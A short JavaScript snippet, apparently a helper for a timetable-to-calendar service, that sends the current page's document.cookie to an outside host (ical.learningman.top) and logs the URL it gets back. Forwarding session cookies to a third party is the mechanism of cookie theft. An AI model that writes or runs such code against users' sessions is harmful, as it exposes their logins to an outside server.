fetch(`https://ical.learningman.top/refresh?cookies=${encodeURIComponent(document.cookie)}&method=curriculum`, {
    method: 'POST',
    cache: 'no-cache',
    credentials: 'same-origin',
    mode: 'cors',
    redirect: 'follow',
    referrer: 'no-referrer',
}).then((resp) => {
    return resp.text()
}).then(uri => {
    console.log(uri)
})